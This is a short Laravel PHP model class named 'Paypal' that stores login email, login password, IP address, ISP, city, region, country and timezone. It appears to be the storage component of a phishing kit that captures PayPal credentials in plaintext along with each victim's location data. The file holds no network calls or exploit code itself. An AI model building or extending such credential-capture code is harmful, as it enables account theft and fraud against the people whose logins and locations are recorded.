<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;

class Paypal extends Model
{
    use HasFactory;

    protected $fillable = [
        'login_email',
        'login_password',
        'ip',
        'isp',
        'city',
        'region',
        'country',
        'timezone',
    ];
}
